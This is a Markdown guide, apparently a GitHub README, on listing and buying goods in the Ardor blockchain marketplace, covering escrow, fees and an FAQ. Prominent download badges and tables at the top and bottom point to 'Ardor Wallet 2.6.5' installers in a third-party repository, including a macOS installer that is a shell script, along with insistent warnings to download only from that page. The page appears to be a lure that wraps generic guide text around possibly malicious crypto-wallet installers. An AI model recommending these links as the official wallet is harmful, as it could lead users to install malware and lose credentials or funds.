![Ardor Wallet guide](assets/banner-article.png)

# Sell on the Ardor marketplace

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

The Ardor marketplace lets an account list goods or services on chain with a price, a quantity and an optional escrow arrangement. Buyers pay in the chain's token, the purchase is recorded as a transaction, and the seller delivers against a listing that anyone can read.

## What the marketplace is

It is a listing feature built into the platform rather than a website. A listing is a transaction, so it has a timestamp, an owner and a state that can be read by anyone with a wallet. There is no shop front to design and no [account](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md) to create with a third party.

That shape suits digital goods and small services better than physical retail. Delivery is arranged between buyer and seller; the [Ardor chain](https://github.com/ardor-software/ardor-platform-guides/blob/main/ardor-child-chains-explained.md) records the sale and the payment, not the shipment.

## Creating a listing

1. Unlock the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) and choose the chain that will hold the listing.
2. Open the marketplace section and choose to add a listing.
3. Enter the name and description, the price, the quantity and how long the listing should run.
4. Choose whether to require escrow, and which account holds it if you do.
5. Confirm the transaction and pay the [Ardor fee](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/why-an-ardor-transaction-stays-unconfirmed.md).
6. Check the listing appears and reads as you intended before you tell anyone about it.

Step six is worth the extra minute. A listing with a typo in the price cannot be edited into correctness; it can only be delisted and replaced, which costs another fee.

## How escrow works

Escrow puts a third account between buyer and seller: the payment is held until the terms are met, and released when the escrow account approves. It reduces one specific risk - the buyer paying and receiving nothing - at the cost of trusting the escrow account.

Choosing who holds escrow is therefore the whole decision. A neutral party both sides accept adds real protection; an account controlled by the seller adds a step and no protection at all.

## Buying from a listing

1. Find the listing, either by browsing the marketplace section or from a link the seller published.
2. Check the description, the price and whether escrow is required.
3. Purchase from the wallet, confirming the amount and the fee.
4. Keep the transaction ID; it is the proof of purchase if anything goes wrong.

A buyer has no recourse on chain. The sale is final in the same way a transfer is final, which is why escrow exists and why reading the listing carefully is the buyer's main protection.

## Fees and pricing

Listing and purchasing are both transactions, so both cost a fee in the chain's token. On a child chain that fee is normally carried by a bundler, which means the buyer or seller may not need the parent chain's coin at all.

Pricing is a separate question from fees. The marketplace does not set or suggest prices, and there is no order book to discover one. A seller chooses a number and the market answers by buying or not.

## What the marketplace does not do

It does not hold the goods, verify the seller or arbitrate a dispute. Escrow can reduce a specific risk, but the platform itself is not a party to the sale and will not reverse a payment that both sides signed.

That is worth stating plainly because marketplaces elsewhere train people to expect buyer protection. Here the protection is the arrangement you choose, plus the reputation you build by delivering.

## Running a listing well

Write a description that answers the questions a buyer will ask before paying: what exactly is being sold, how it is delivered, and what happens if it does not arrive. Update the listing when the terms change rather than leaving a stale description in place.

For repeat sellers, the transaction history is the reputation. A buyer can read previous sales and see whether the account has delivered before, which is a more durable signal than any badge.

## Physical goods and digital delivery

Digital goods fit the marketplace almost perfectly: the description is the product, delivery is a message or a file, and the transaction record is the receipt. Physical goods need a delivery arrangement the chain does not provide.

If you sell something that ships, say how and when in the description, and use escrow so the buyer is not paying a stranger on trust. A listing that promises delivery without saying who pays for shipping invites the dispute it will eventually get.

## What buyers look at first

Buyers read three things before paying: what the item is, what happens if it does not arrive, and whether the seller has sold before. A description that answers the first two and a history that answers the third do more for a listing than any amount of styling.

That is worth planning for. A new account with no sales history is starting from zero, and the fastest way to build one is a small, cheap, well-described listing that delivers exactly what it promised.

## FAQ

### Do I need to host a website to sell?

No. The listing lives on chain and buyers reach it from the wallet or from a link you publish elsewhere.

### Can I edit a listing after creating it?

You can delist and create a new one. Treat the price and description as fixed once the transaction is confirmed.

### Is escrow required?

It is optional at listing time. Requiring it generally improves a buyer's confidence, provided the escrow account is one both sides trust.

### Can a purchase be reversed?

No. A confirmed transaction is final, which is why escrow and clear descriptions matter more here than on a platform with chargebacks.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Issue an asset or a custom currency on Ardor, and trade it](https://github.com/ardor-software/ardor-platform-guides/blob/main/issue-and-trade-assets-on-ardor.md)
- [Trade on the Ardor coin exchange](https://github.com/ardor-software/ardor-platform-guides/blob/main/trade-on-the-ardor-coin-exchange.md)
- [What Ignis is on Ardor, and what the wallet does with it](https://github.com/ardor-software/ardor-platform-guides/blob/main/what-is-ignis-on-ardor.md)
- [Create a poll and vote in the Ardor wallet](https://github.com/ardor-software/ardor-platform-guides/blob/main/create-a-poll-in-ardor-wallet.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
